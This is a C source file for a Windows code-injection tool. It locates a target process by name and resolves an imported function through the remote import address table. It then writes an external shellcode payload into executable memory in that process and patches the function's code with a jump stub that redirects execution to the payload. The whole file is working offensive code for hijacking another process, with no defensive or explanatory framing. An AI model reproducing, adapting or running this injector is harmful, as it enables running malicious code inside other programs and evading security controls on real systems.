#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <psapi.h>
#include "Payload.h"

#pragma comment(lib, "dbghelp.lib")

DWORD findPID( LPCSTR procName ) {

    HANDLE hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );

    if ( hSnapshot == INVALID_HANDLE_VALUE ) {
        printf( "[-] Failed to create snapshot of processes.\n" );
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof( PROCESSENTRY32 );

    DWORD pid = 0;

    if ( Process32First( hSnapshot, &pe32 ) ) {
        do {
            if ( strcmp( pe32.szExeFile, procName ) == 0 ) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while ( Process32Next( hSnapshot, &pe32 ) );
    }

    CloseHandle( hSnapshot );

    return pid;
}

BYTE hookStub_64[] = {
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // mov rax, shellcode_addr
    0xFF, 0xE0,                                                     // jmp rax
};

BOOL PatchRemoteFunction( HANDLE hProcess, PVOID funcAddr, PVOID shellcodeAddr ) {

    DWORD oldProtect;
    SIZE_T stubSize = sizeof( hookStub_64 );
    BYTE stub[ sizeof( hookStub_64 ) ];

    memcpy( stub, hookStub_64, stubSize );

    *( ULONG64* )( stub + 2 ) = ( ULONG64 )shellcodeAddr;

    if ( !VirtualProtectEx( hProcess, funcAddr, stubSize, PAGE_EXECUTE_READ, &oldProtect ) ) {
        fprintf( stderr, "[-] Failed to change memory protection.\n" );
        return FALSE;
    }

    if ( !WriteProcessMemory( hProcess, funcAddr, stub, stubSize, NULL ) ) {
        fprintf( stderr, "[-] Failed to write hook stub to remote process.\n" );
        VirtualProtectEx( hProcess, funcAddr, stubSize, oldProtect, &oldProtect );
        return FALSE;
    }

    VirtualProtectEx( hProcess, funcAddr, stubSize, oldProtect, &oldProtect );

    printf( "[+] Hook stub written at: 0x%p\n", funcAddr );
    printf( "[+] Stub will jump to shellcode at: 0x%p\n", shellcodeAddr );


    return TRUE;

}

void ReadRemoteString( HANDLE hProcess, LPVOID address, char* buffer, size_t maxSize ) {
    if ( !ReadProcessMemory( hProcess, address, buffer, maxSize - 1, NULL ) ) {
        buffer[ 0 ] = '\0';
        return;
    }
    buffer[ maxSize - 1 ] = '\0';
}

BOOL IsProcess64Bit( HANDLE hProcess ) {
    BOOL isWow64 = FALSE;
    if ( !IsWow64Process( hProcess, &isWow64 ) ) {
        return FALSE;
    }
    SYSTEM_INFO si;
    GetNativeSystemInfo( &si );
    return ( si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ) && !isWow64;
}

PVOID GetRemoteIAT( HANDLE hProcess, HMODULE hModule, LPCSTR filterFunc ) {

    IMAGE_DOS_HEADER dosHeader;
    SIZE_T bytesRead;

    if ( !ReadProcessMemory( hProcess, hModule, &dosHeader, sizeof( IMAGE_DOS_HEADER ), &bytesRead ) ) {
        fprintf( stderr, "[-] Failed to read DOS header from remote process.\n" );
        return NULL;
    }

    if ( dosHeader.e_magic != IMAGE_DOS_SIGNATURE ) {
        fprintf( stderr, "[-] Invalid DOS signature.\n" );
        return NULL;
    }

    IMAGE_NT_HEADERS ntHeaders;
    LPVOID ntHeaderAddr = ( LPVOID )( ( PBYTE )hModule + dosHeader.e_lfanew );
    if ( !ReadProcessMemory( hProcess, ntHeaderAddr, &ntHeaders, sizeof( IMAGE_NT_HEADERS ), &bytesRead ) ) {
        fprintf( stderr, "[-] Failed to read NT headers from remote process.\n" );
        return NULL;
    }

    if ( ntHeaders.Signature != IMAGE_NT_SIGNATURE ) {
        fprintf( stderr, "[-] Invalid NT signature.\n" );
        return NULL;
    }

    DWORD importRVA = ntHeaders.OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ].VirtualAddress;
    DWORD importSize = ntHeaders.OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ].Size;

    if ( importRVA == 0 || importSize == 0 ) {
        fprintf( stderr, "[-] No import directory found.\n" );
        return NULL;
    }

    DWORD maxDescriptors = importSize / sizeof( IMAGE_IMPORT_DESCRIPTOR );
    if ( maxDescriptors == 0 ) {
        fprintf( stderr, "[-] No import descriptors found.\n" );
        return NULL;
    }

    PIMAGE_IMPORT_DESCRIPTOR importDesc = ( PIMAGE_IMPORT_DESCRIPTOR )malloc( importSize );
    if ( !importDesc ) {
        fprintf( stderr, "[-] Failed to allocate memory for import descriptors.\n" );
        return NULL;
    }

    LPVOID importDescAddr = ( LPVOID )( ( PBYTE )hModule + importRVA );
    if ( !ReadProcessMemory( hProcess, importDescAddr, importDesc, importSize, &bytesRead ) ) {
        fprintf( stderr, "[-] Failed to read import descriptors from remote process.\n" );
        free( importDesc );
        return NULL;
    }

    BOOL foundAny = FALSE;

    for ( DWORD i = 0; i < maxDescriptors && importDesc[ i ].Name != 0; i++ ) {
        LPVOID nameAddr = ( LPVOID )( ( PBYTE )hModule + importDesc[ i ].Name );
        CHAR dllName[ MAX_PATH ];
        ReadRemoteString( hProcess, nameAddr, dllName, sizeof( dllName ) );

        if ( dllName[ 0 ] == '\0' ) continue;
        // printf( "[+] Module: %s\n", dllName );

        // LPCSTR requiredModuel = "KERNEL32.dll";
        // if ( _stricmp( dllName, requiredModuel ) != 0 ) {
        //     printf( "    Skipping module: %s\n", dllName );
        //     continue;
        // }

        LPVOID originalThunkAddr = ( LPVOID )( ( PBYTE )hModule + importDesc[ i ].OriginalFirstThunk );
        LPVOID firstThunkAddr = ( LPVOID )( ( PBYTE )hModule + importDesc[ i ].FirstThunk );

        if ( importDesc[ i ].OriginalFirstThunk == 0 ) {
            originalThunkAddr = firstThunkAddr;
        }

        BOOL moduleHasMatch = FALSE;

        while ( 1 ) {
            IMAGE_THUNK_DATA thunk;
            if ( !ReadProcessMemory( hProcess, originalThunkAddr, &thunk, sizeof( IMAGE_THUNK_DATA ), &bytesRead ) ) {
                break;
            }

            if ( thunk.u1.Function == 0 ) break;

            DWORD_PTR functionAddress;
            if ( !ReadProcessMemory( hProcess, firstThunkAddr, &functionAddress, sizeof( DWORD_PTR ), &bytesRead ) ) {
                break;
            }

            if ( IMAGE_SNAP_BY_ORDINAL( thunk.u1.Ordinal ) ) {
                if ( filterFunc == NULL ) {
                    if ( !moduleHasMatch ) {
                        printf( "\n[+] Module: %s\n", dllName );
                        moduleHasMatch = TRUE;
                        foundAny = TRUE;
                    }
                    printf( "    Ordinal: %llu -> 0x%p\n",
                        ( unsigned long long )IMAGE_ORDINAL( thunk.u1.Ordinal ),
                        ( PVOID )functionAddress );
                }
            }
            else {
                LPVOID importByNameAddr = ( LPVOID )( ( BYTE* )hModule + thunk.u1.AddressOfData );

                WORD hint;
                if ( !ReadProcessMemory( hProcess, importByNameAddr, &hint, sizeof( WORD ), &bytesRead ) ) {
                    break;
                }

                char funcName[ 256 ];
                LPVOID funcNameAddr = ( LPVOID )( ( BYTE* )importByNameAddr + sizeof( WORD ) );
                ReadRemoteString( hProcess, funcNameAddr, funcName, sizeof( funcName ) );

                if ( funcName[ 0 ] != '\0' ) {
                    if ( filterFunc == NULL || _stricmp( funcName, filterFunc ) == 0 ) {
                        if ( !moduleHasMatch ) {
                            printf( "\n[+] Module: %s\n", dllName );
                            moduleHasMatch = TRUE;
                            foundAny = TRUE;
                        }
                        printf( "    %s -> 0x%p\n", funcName, ( PVOID )functionAddress );
                        PVOID pFuncAddr = ( PVOID )functionAddress;
                        free( importDesc );
                        return pFuncAddr;
                    }

                }
            }

            originalThunkAddr = ( LPVOID )( ( BYTE* )originalThunkAddr + sizeof( IMAGE_THUNK_DATA ) );
            firstThunkAddr = ( LPVOID )( ( BYTE* )firstThunkAddr + sizeof( IMAGE_THUNK_DATA ) );
        }

    }

    free( importDesc );
    return NULL;
}


int main( int argc, char* argv[] ) {


    if ( argc < 2 ) {
        fprintf( stderr, "Usage: %s <process_name>\n", argv[ 0 ] );
        return 1;
    }

    LPCSTR procName = argv[ 1 ];
    LPCSTR filterFunc = NULL;
    DWORD pid = findPID( procName );

    if ( !pid ) {
        fprintf( stderr, "[-] Failed to find process: %s\n", procName );
        return 1;
    }

    if ( argc >= 3 ) {
        for ( int i = 1; i < argc; i++ ) {
            if ( strcmp( argv[ i ], "--funcName" ) == 0 ) {
                if ( i + 1 < argc ) {
                    filterFunc = argv[ i + 1 ];
                    printf( "[+] Filtering for function: %s\n", filterFunc );
                }
                else {
                    fprintf( stderr, "[-] --funcName option requires an argument.\n" );
                    return 1;
                }
            }
        }

    }

    printf( "[+] Found process %s with PID: %lu\n", procName, pid );

    HANDLE hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid );
    if ( !hProcess ) {
        fprintf( stderr, "[-] Failed to open process with PID: %lu\n", pid );
        return 1;
    }

    HMODULE hModule = NULL;
    DWORD cbNeeded;

    if ( !EnumProcessModules( hProcess, &hModule, sizeof( HMODULE ), &cbNeeded ) ) {
        fprintf( stderr, "[-] Failed to get main module\n" );
        CloseHandle( hProcess );
        return 1;
    }

    CHAR szModName[ MAX_PATH ];
    if ( GetModuleFileNameExA( hProcess, hModule, szModName, sizeof( szModName ) / sizeof( CHAR ) ) ) {
        printf( "[+] Analyzing main module: %s\n", szModName );
    }

    PVOID pFuncAddr = GetRemoteIAT( hProcess, hModule, filterFunc );

    if ( !pFuncAddr ) {
        printf( "[-] Function not found in IAT.\n" );
    }
    else {
        printf( "[+] Function address: 0x%p\n", pFuncAddr );
    }


    PVOID pRemoteBuffer = VirtualAllocEx( hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( pRemoteBuffer == NULL ) {
        fprintf( stderr, "[-] Failed to allocate memory in remote process.\n" );
        CloseHandle( hProcess );
        return 1;
    }

    printf( "[+] Allocated %ld bytes at 0x%p\n", payloadSize, pRemoteBuffer );

    SIZE_T bytesWritten;
    if ( !WriteProcessMemory( hProcess, pRemoteBuffer, payload, payloadSize, &bytesWritten ) ) {
        fprintf( stderr, "[-] Failed to write payload to remote process.\n" );
        VirtualFreeEx( hProcess, pRemoteBuffer, 0, MEM_RELEASE );
        CloseHandle( hProcess );
        return 1;
    }

    printf( "[+] Wrote %zu bytes to 0x%p\n", bytesWritten, pRemoteBuffer );

    DWORD oldProtect;
    if ( !VirtualProtectEx( hProcess, pRemoteBuffer, payloadSize, PAGE_EXECUTE_READ, &oldProtect ) ) {
        fprintf( stderr, "[-] Failed to change memory protection of remote buffer.\n" );
        VirtualFreeEx( hProcess, pRemoteBuffer, 0, MEM_RELEASE );
        CloseHandle( hProcess );
        return 1;
    }

    if ( !PatchRemoteFunction( hProcess, pFuncAddr, pRemoteBuffer ) ) {
        fprintf( stderr, "[-] Failed to patch remote function.\n" );
        VirtualFreeEx( hProcess, pRemoteBuffer, 0, MEM_RELEASE );
        CloseHandle( hProcess );
        return 1;
    }

    CloseHandle( hProcess );
    return 0;
}
